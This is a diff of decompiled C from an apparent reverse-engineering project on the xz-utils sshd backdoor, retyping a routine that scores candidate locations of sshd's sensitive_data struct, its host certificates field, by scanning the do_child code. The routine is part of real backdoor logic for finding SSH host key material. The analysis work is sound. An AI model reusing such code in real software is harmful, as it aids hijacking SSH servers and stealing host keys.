@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103870_sshd_score_sensitive_data_candidate_in_do_child.c
 // Function: sshd_score_sensitive_data_candidate_in_do_child @ 0x103870
 // Calling convention: __stdcall
-// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_do_child(void * sensitive_data, elf_info_t * elf, string_references_t * refs)
+// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_do_child(sensitive_data * sensitive_data, elf_info_t * elf, string_references_t * refs)
 
 
 /*
@@ -11,7 +11,7 @@
 #include "xzre_types.h"
 
 int sshd_score_sensitive_data_candidate_in_do_child
-              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)
+              (sensitive_data *sensitive_data,elf_info_t *elf,string_references_t *refs)
 
 {
   u8 *code_start;
@@ -43,12 +43,12 @@ int sshd_score_sensitive_data_candidate_in_do_child
     }
     hit_found = find_riprel_ptr_lea_or_mov_load
                       (code_start,code_end,(dasm_ctx_t *)&do_child_start,
-                       (void *)((long)sensitive_data + 0x10));
+                       &sensitive_data->host_certificates);
     if (hit_found != FALSE) {
       // AutoDoc: A second access to the +0x10 field within the remaining code bumps the score by another point.
       hit_found = find_riprel_ptr_lea_or_mov_load
                         (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
-                         (void *)((long)sensitive_data + 0x10));
+                         &sensitive_data->host_certificates);
       if (hit_found == FALSE) {
         score = score + 1;
       }
